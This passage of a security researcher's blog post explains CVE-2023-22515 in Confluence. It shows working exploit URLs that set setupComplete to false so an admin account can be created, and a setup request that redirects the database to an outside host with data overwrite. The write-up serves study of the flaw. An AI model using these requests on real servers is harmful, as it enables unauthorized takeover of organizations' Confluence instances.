+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iT1VHRXIgUWRBZGhmIiB3aWR0aD0iMjJweCIgaGVpZ2h0PSIyMnB4IiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZpbGw9ImN1cnJlbnRDb2xvciIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIgLz48cGF0aCBkPSJNMy45IDEyYzAtMS43MSAxLjM5LTMuMSAzLjEtMy4xaDRWN0g3Yy0yLjc2IDAtNSAyLjI0LTUgNXMyLjI0IDUgNSA1aDR2LTEuOUg3Yy0xLjcxIDAtMy4xLTEuMzktMy4xLTMuMXpNOCAxM2g4di0ySDh2MnptOS02aC00djEuOWg0YzEuNzEgMCAzLjEgMS4zOSAzLjEgMy4xcy0xLjM5IDMuMS0zLjEgMy4xaC00VjE3aDRjMi43NiAwIDUtMi4yNCA1LTVzLTIuMjQtNS01LTV6IiAvPjwvc3ZnPg==" alt="">{.OUGEr
+.QdAdhf}</p>
+<p>Rabbit Hole 2 - Trying to bypass isSafeComplexParameterName</p>
+<p>We can't just use nested parameters and modify ApplicationConfig
+because, SafeParameterInterceptor parses the given parameters and uses
+regular expression to determine if its of form test['asd'],
+test[0], and test.asd,  if it determines its a complex parameter, then
+it checks if the @ParameterSafe annotation is set on the current
+action/endpoint we are calling. If only the said annotation exist then
+only we can use complex nested parameters. If ParameterSafe annotation
+is not set, we can only use basic parameters (?a=b&amp;c=d) and not complex
+parameters (?a.b=1&amp;c['d']=1)</p>
+<p>I checked what all other actions has @ParameterSafe annotation, but
+most of them need authentication.<br>
+<br>
+One interesting action has this annotation @ParameterSafe which is
+/setup/setupdbtype.action, sadly we can't reach this cuz we need
+isSetupComplete to be true which is what we are trying xD.</p>
+<p><a href="https://vuln.com/setup/setupdbtype.action?dbConfigInfo.simple=false&amp;database=postgresql&amp;dbConfigInfo.databaseType=postgresql&amp;forceOverwriteExistingData=true&amp;dbConfigInfo.driverClassName=org.postgresql.Driver&amp;dbConfigInfo.databaseUrl=jdbc%3Apostgresql%3A%2F%2Fvps.noob.ninja%3A5432%2Fasdff&amp;dbConfigInfo.userName=postgres&amp;dbConfigInfo.password=new_password&amp;dbConfigInfo.dialect=com.atlassian.confluence.impl.hibernate.dialect.PostgreSQLDialect&amp;atl_token=523a41695524f39caca3375d37233115c6a4f310">https://vuln.com/setup/setupdbtype.action?dbConfigInfo.simple=false&amp;database=postgresql&amp;dbConfigInfo.databaseType=postgresql&amp;forceOverwriteExistingData=true&amp;dbConfigInfo.driverClassName=org.postgresql.Driver&amp;dbConfigInfo.databaseUrl=jdbc%3Apostgresql%3A%2F%2Fvps.noob.ninja%3A5432%2Fasdff&amp;dbConfigInfo.userName=postgres&amp;dbConfigInfo.password=new_password&amp;dbConfigInfo.dialect=com.atlassian.confluence.impl.hibernate.dialect.PostgreSQLDialect&amp;atl_token=523a41695524f39caca3375d37233115c6a4f310</a>{.XqQF9c
+target=&quot;_blank&quot; style=&ldquo;color: inherit; text-decoration: none;&quot;} </p>
+<p>The Rabbit hole I fell is trying to bypass isSafeComplexParameterName.
+If we can craft a nested URL parameter which can fool
+isSafeParameterName to think its a basic/safe parameter then the
+annotation check won't be performed. I spent lot of time spending
+trying ways to craft a URL parameter. </p>
+<p><img src="https://lh5.googleusercontent.com/tz-n7noErXwRGl_-7iRGQ0H-wyY4pnYWMuZNaIOavvPIQFHZvc0EQnWqtripqBiAFYh7O0BrsgPUlz7OWcRL9h-kznpKMecNnytAVuy7YDYLQcksTDq786nD7SlDId0vWw=w1280" alt="">{.CENy8b
+role=&ldquo;img&rdquo;}</p>
+<p>One URL which bypasses the check is, notice [0] the
+Pattern.compile(&quot;.*\\['[a-zA-Z0-9_]+'\\]&quot;).matcher(key).matches()
+regex fails recognising this as complex parameter and returns false,
+which is what we needed. </p>
+<p> <a href="https://vuln.com/some.action?blah.applicationConfig.setupComplete=false">https://vuln.com/some.action?bootstrapStatusProvider['applicationConfig'][0]=0<br>
+<br>
+</a>{.XqQF9c
+target=&quot;_blank&rdquo; style=&ldquo;color: inherit; text-decoration: none;&quot;}I spent
+lot of time spending ways to find gadget where I can modify Array/List
+which will trigger the vulnerability. Sadly, I failed in it.</p>
+<p><br>
+Funny enough, the URL I crafted 8 hours back which is enough to trigger
+the vulnerability and make the setupComplete to false. I know why it
+works, check the above code clearly and try to figure it out. And share
+the solution in DMs with me :)</p>
+<p><a href="https://vuln.com/some.action?blah.applicationConfig.setupComplete=false">https://vuln.com/some.action?bootstrapStatusProvider.applicationConfig.setupComplete=0<br>
+<br>
+</a>{.XqQF9c
+target=&quot;_blank&rdquo; style=&ldquo;color: inherit; text-decoration: none;&quot;}Once we
+make setupComplete to false, you can just create an admin user and get
+access to Confluence.</p>
+<p>\</p>
+<h2 id="h.qr0eix1yansu_l" class="zfr3Q JYVBee CDt4Ke" dir="ltr" style=""></h2>
+<p><a href="#h.qr0eix1yansu"></a>{.FKF6mc .TpQm9d aria-label=&ldquo;Copy heading link&rdquo;
+jsname=&ldquo;hiK3ld&rdquo; role=&ldquo;button&rdquo; aria-describedby=&ldquo;h.qr0eix1yansu_l&rdquo;}</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iT1VHRXIgUWRBZGhmIiB3aWR0aD0iMjJweCIgaGVpZ2h0PSIyMnB4IiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZpbGw9ImN1cnJlbnRDb2xvciIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIgLz48cGF0aCBkPSJNMy45IDEyYzAtMS43MSAxLjM5LTMuMSAzLjEtMy4xaDRWN0g3Yy0yLjc2IDAtNSAyLjI0LTUgNXMyLjI0IDUgNSA1aDR2LTEuOUg3Yy0xLjcxIDAtMy4xLTEuMzktMy4xLTMuMXpNOCAxM2g4di0ySDh2MnptOS02aC00djEuOWg0YzEuNzEgMCAzLjEgMS4zOSAzLjEgMy4xcy0xLjM5IDMuMS0zLjEgMy4xaC00VjE3aDRjMi43NiAwIDUtMi4yNCA1LTVzLTIuMjQtNS01LTV6IiAvPjwvc3ZnPg==" alt="">{.OUGEr
+.QdAdhf}</p>
+<p>Conclusions</p>
+<p>I had great fun working along with Rahul Maini, and suffering while
+working on this. Learned a lot about Struts, and JAVA. I hope you learn
+something with the blog, with that I will leave two tasks to the reader.
+And Thanks to TheGrandPew for the inspiration(I still dont understand
+how he was so quick xd)</p>
+<h2 id="h.yqgvq816huvo_l" class="zfr3Q JYVBee CDt4Ke" dir="ltr" style=""></h2>
+<p><a href="#h.yqgvq816huvo"></a>{.FKF6mc .TpQm9d aria-label=&ldquo;Copy heading link&rdquo;
+jsname=&ldquo;hiK3ld&rdquo; role=&ldquo;button&rdquo; aria-describedby=&ldquo;h.yqgvq816huvo_l&rdquo;}</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iT1VHRXIgUWRBZGhmIiB3aWR0aD0iMjJweCIgaGVpZ2h0PSIyMnB4IiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZpbGw9ImN1cnJlbnRDb2xvciIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIgLz48cGF0aCBkPSJNMy45IDEyYzAtMS43MSAxLjM5LTMuMSAzLjEtMy4xaDRWN0g3Yy0yLjc2IDAtNSAyLjI0LTUgNXMyLjI0IDUgNSA1aDR2LTEuOUg3Yy0xLjcxIDAtMy4xLTEuMzktMy4xLTMuMXpNOCAxM2g4di0ySDh2MnptOS02aC00djEuOWg0YzEuNzEgMCAzLjEgMS4zOSAzLjEgMy4xcy0xLjM5IDMuMS0zLjEgMy4xaC00VjE3aDRjMi43NiAwIDUtMi4yNCA1LTVzLTIuMjQtNS01LTV6IiAvPjwvc3ZnPg==" alt="">{.OUGEr
+.QdAdhf}</p>
+<p><br>
+Task #1</p>
+<p>Figure out why the above URL works without needing to bypass 
+isSafeComplexParameterName.  Reply in the tweet please.<br>
+<br>
+Solvers:</p>
+<p>you?</p>
+<p>\</p>
+<h2 id="h.ooz20anamkh3_l" class="zfr3Q JYVBee CDt4Ke" dir="ltr" style=""></h2>
+<p><a href="#h.ooz20anamkh3"></a>{.FKF6mc .TpQm9d aria-label=&ldquo;Copy heading link&rdquo;
+jsname=&ldquo;hiK3ld&rdquo; role=&ldquo;button&rdquo; aria-describedby=&ldquo;h.ooz20anamkh3_l&rdquo;}</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iT1VHRXIgUWRBZGhmIiB3aWR0aD0iMjJweCIgaGVpZ2h0PSIyMnB4IiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZpbGw9ImN1cnJlbnRDb2xvciIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIgLz48cGF0aCBkPSJNMy45IDEyYzAtMS43MSAxLjM5LTMuMSAzLjEtMy4xaDRWN0g3Yy0yLjc2IDAtNSAyLjI0LTUgNXMyLjI0IDUgNSA1aDR2LTEuOUg3Yy0xLjcxIDAtMy4xLTEuMzktMy4xLTMuMXpNOCAxM2g4di0ySDh2MnptOS02aC00djEuOWg0YzEuNzEgMCAzLjEgMS4zOSAzLjEgMy4xcy0xLjM5IDMuMS0zLjEgMy4xaC00VjE3aDRjMi43NiAwIDUtMi4yNCA1LTVzLTIuMjQtNS01LTV6IiAvPjwvc3ZnPg==" alt="">{.OUGEr
+.QdAdhf}</p>
+<p>Task #2</p>
+<p>In the latest version, the above bypass I found with array index
+accessor still works, I couldn't find a way to exploit this if you can
+find a gadget that would  modify some array index, which can change some
+config, or something impactful, then it would lead to one more 0-day.</p>
+<p><br>
+<a href="https://vuln.com/some.action?blah.applicationConfig.setupComplete=false">https://vuln.com/some.action?bootstrapStatusProvider['applicationConfig'][0]=0<br>
+<br>
+</a>{.XqQF9c
+target=&quot;_blank&rdquo; style=&ldquo;color: inherit; text-decoration: none;&quot;}Solvers:</p>
+<p>you?</p>
+<p>\</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdib3g9IjAgMCAyNCAyNCIgZm9jdXNhYmxlPSJmYWxzZSIgY2xhc3M9IiBOTW01TSI+PHBhdGggZD0iTTExIDE3aDJ2LTZoLTJ2NnptMS0xNUM2LjQ4IDIgMiA2LjQ4IDIgMTJzNC40OCAxMCAxMCAxMCAxMC00LjQ4IDEwLTEwUzE3LjUyIDIgMTIgMnptMCAxOGMtNC40MSAwLTgtMy41OS04LThzMy41OS04IDgtOCA4IDMuNTkgOCA4LTMuNTkgOC04IDh6TTExIDloMlY3aC0ydjJ6IiAvPjwvc3ZnPg==" alt="">{.NMm5M}</p>
+<p>Google Sites</p>
+<p>Report abuse</p>
+<p>Page details</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdib3g9IjAgMCAyNCAyNCIgZm9jdXNhYmxlPSJmYWxzZSIgY2xhc3M9IiBOTW01TSI+PHBhdGggZD0iTTExIDE3aDJ2LTZoLTJ2NnptMS0xNUM2LjQ4IDIgMiA2LjQ4IDIgMTJzNC40OCAxMCAxMCAxMCAxMC00LjQ4IDEwLTEwUzE3LjUyIDIgMTIgMnptMCAxOGMtNC40MSAwLTgtMy41OS04LThzMy41OS04IDgtOCA4IDMuNTkgOCA4LTMuNTkgOC04IDh6TTExIDloMlY3aC0ydjJ6IiAvPjwvc3ZnPg==" alt="">{.NMm5M}</p>
+<p>Page updated</p>
+<p>Google Sites</p>
+<p>Report abuse</p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">Posts</a></li>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#h.n671hbs3m557">CVE-2023-22515 - Broken Access Control Vulnerability in Confluence Data Center and Server</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&text=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&title=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&is_video=false&description=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server&body=Check out this article: %2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&title=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&title=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=%2f%2flocalhost%3a1313%2fposts%2fbroken-conflu%2f&name=CVE-2023-22515%20-%20Broken%20Access%20Control%20Vulnerability%20in%20Confluence%20Data%20Center%20and%20Server&description=%3cp%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iVjRZUjJjIiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZvY3VzYWJsZT0iZmFsc2UiPjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiIC8%2bPHBhdGggZD0iTTIwIDExSDcuODNsNS41OS01LjU5TDEyIDRsLTggOCA4IDggMS40MS0xLjQxTDcuODMgMTNIMjB2LTJ6IiAvPjwvc3ZnPg%3d%3d%22%20alt%3d%22%22%3e%7b.V4YR2c%7d%3c%2fp%3e%0a%3cp%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0idnU4UHdlIiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZvY3VzYWJsZT0iZmFsc2UiPjxwYXRoIGQ9Ik0xNS41IDE0aC0uNzlsLS4yOC0uMjdDMTUuNDEgMTIuNTkgMTYgMTEuMTEgMTYgOS41IDE2IDUuOTEgMTMuMDkgMyA5LjUgM1MzIDUuOTEgMyA5LjUgNS45MSAxNiA5LjUgMTZjMS42MSAwIDMuMDktLjU5IDQuMjMtMS41N2wuMjcuMjh2Ljc5bDUgNC45OUwyMC40OSAxOWwtNC45OS01em0tNiAwQzcuMDEgMTQgNSAxMS45OSA1IDkuNVM3LjAxIDUgOS41IDUgMTQgNy4wMSAxNCA5LjUgMTEuOTkgMTQgOS41IDE0eiIgLz48cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIiAvPjwvc3ZnPg%3d%3d%22%20alt%3d%22%22%3e%7b.vu8Pwe%7d%3c%2fp%3e%0a%3cp%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iVjRZUjJjIiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZvY3VzYWJsZT0iZmFsc2UiPjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiIC8%2bPHBhdGggZD0iTTIwIDExSDcuODNsNS41OS01LjU5TDEyIDRsLTggOCA4IDggMS40MS0xLjQxTDcuODMgMTNIMjB2LTJ6IiAvPjwvc3ZnPg%3d%3d%22%20alt%3d%22%22%3e%7b.V4YR2c%7d%3c%2fp%3e%0a%3cp%3eSearch%20this%20site%3c%2fp%3e%0a%3cp%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iZkFVRVVkIiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZvY3VzYWJsZT0iZmFsc2UiPjxwYXRoIGQ9Ik0xOSA2LjQxTDE3LjU5IDUgMTIgMTAuNTkgNi40MSA1IDUgNi40MSAxMC41OSAxMiA1IDE3LjU5IDYuNDEgMTkgMTIgMTMuNDEgMTcuNTkgMTkgMTkgMTcuNTkgMTMuNDEgMTJ6IiAvPjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiIC8%2bPC9zdmc%2b%22%20alt%3d%22%22%3e%7b.fAUEUd%7d%3c%2fp%3e%0a%3cp%3eSkip%20to%20main%20content%3c%2fp%3e%0a%3cp%3eSkip%20to%20navigation%3c%2fp%3e%0a%3cp%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0id0ZDV25lIiB2aWV3Ym94PSIwIDAgMjQgMjQiIHN0cm9rZT0iY3VycmVudENvbG9yIiBqc25hbWU9IkIxbjl1YiIgZm9jdXNhYmxlPSJmYWxzZSI%2bPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTIsMTIpIj48cGF0aCBjbGFzcz0iaGxKSDAiIGQ9Ik0tOSAtNSBMOSAtNSIgZmlsbD0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIyIiAvPjxwYXRoIGNsYXNzPSJIQnU2TiIgZD0iTS05IDAgTDkgMCIgZmlsbD0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIyIiAvPjxwYXRoIGNsYXNzPSJjTEFHUWUiIGQ9Ik0tOSA1IEw5IDUiIGZpbGw9Im5vbmUiIHN0cm9rZS13aWR0aD0iMiIgLz48L2c%2bPC9zdmc%2b%22%20alt%3d%22%22%3e%7b.wFCWne%7d%3c%2fp%3e%0a%3cp%3e%3ca%20href%3d%22%2fhome%22%3e%3cimg%20src%3d%22https%3a%2f%2flh5.googleusercontent.com%2f-oZZhZc9Pzr-nQYzLLJKOOnQOPilv9vMC45HKARYGOqlI_koFYOw63xvcNn-Dt284RgUCmh-Gy261Ul7XwSwd-A%3dw16383%22%20alt%3d%22%22%3e%7b.r9CsCb%0arole%3d%26ldquo%3bimg%26rdquo%3b%0aaria-label%3d%26ldquo%3bSite%20home%26rdquo%3b%7d%3c%2fa%3e%7b.XMyrgf%7d%3ca%20href%3d%22%2fhome%22%3es1r1us%3c%2fa%3e%7b.Zjiec%20.oNsfjf%7d%3c%2fp%3e%0a%3cul%3e%0a%3cli%3e%3ca%20href%3d%22%2fhome%22%3eHome%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%0arole%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%20url%3d%26quot%3b%2fhome%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%0alevel%3d%26ldquo%3b1%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI%2bPHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI%2bPHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4%3d%22%20alt%3d%22%22%3e%7b.dvmRw%7d%0a%3ca%20href%3d%22%2fquestions%22%3eQuestions%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aaria-expanded%3d%26ldquo%3bfalse%26rdquo%3b%20aria-haspopup%3d%26ldquo%3btrue%26rdquo%3b%20url%3d%26quot%3b%2fquestions%26quot%3b%0adata-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b1%26rdquo%3b%7d%0a%3cul%3e%0a%3cli%3e%3ca%20href%3d%22%2fquestions%2fwhy-much-of-science-progress-happened-in-west%22%3ewhy%20much%20of%20science%20progress%20happened%20in%0awest%3f%3c%2fa%3e%7b.aJHbb%0a.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%0anavtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fquestions%2fwhy-much-of-science-progress-happened-in-west%26quot%3b%0adata-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fquestions%2fmy-curse-of-curiosity-and-the-problem-of-choice%22%3emy%20curse%20of%20curiosity%20and%20the%20problem%20of%0achoice%3c%2fa%3e%7b.aJHbb%0a.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%0anavtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fquestions%2fmy-curse-of-curiosity-and-the-problem-of-choice%26quot%3b%0adata-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3c%2ful%3e%0a%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fbooks%22%3eBooks%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%0arole%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%20url%3d%26quot%3b%2fbooks%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%0alevel%3d%26ldquo%3b1%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fadvisories%22%3eAdvisories%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fadvisories%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b1%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3cimg%20src%3d%22data%3aimage%2fsvg%2bxml%3bbase64%2cPHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI%2bPHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI%2bPHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4%3d%22%20alt%3d%22%22%3e%7b.dvmRw%7d%0a%3ca%20href%3d%22%2fCTF%22%3eCTF%3c%2fa%3e%7b.aJHbb%20.dk90Ob%20.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%0arole%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%20aria-expanded%3d%26ldquo%3bfalse%26rdquo%3b%0aaria-haspopup%3d%26ldquo%3btrue%26rdquo%3b%20url%3d%26quot%3b%2fCTF%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b1%26rdquo%3b%7d%0a%3cul%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fbountycon2020%22%3eBountyCon%202020%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fbountycon2020%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fh1-2006-ctf%22%3eH1-2006-CTF%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b%2fCTF%2fh1-2006-ctf%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fhack-lu%22%3eHack.lu%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%0arole%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%20url%3d%26quot%3b%2fCTF%2fhack-lu%26quot%3b%0adata-type%3d%26ldquo%3b1%26rdquo%3b%20level%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2ffacebook-ctf19-writeup%22%3eFacebook%20CTF%2719%20writeup%3c%2fa%3e%7b.aJHbb%0a.hDrhEe%20.HlqNPb%20jsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%0anavtype%3d%26ldquo%3b1%26rdquo%3b%20url%3d%26quot%3b%2fCTF%2ffacebook-ctf19-writeup%26quot%3b%20data-type%3d%26ldquo%3b1%26rdquo%3b%0alevel%3d%26ldquo%3b2%26rdquo%3b%7d%3c%2fli%3e%0a%3cli%3e%3ca%20href%3d%22%2fCTF%2fcsaw19-ctf%22%3eCSAW%2719%20CTF%3c%2fa%3e%7b.aJHbb%20.hDrhEe%20.HlqNPb%0ajsname%3d%26ldquo%3bQwLHlb%26rdquo%3b%20role%3d%26ldquo%3blink%26rdquo%3b%20tabindex%3d%26ldquo%3b0%26rdquo%3b%20navtype%3d%26ldquo%3b1%26rdquo%3b%0aurl%3d%26quot%3b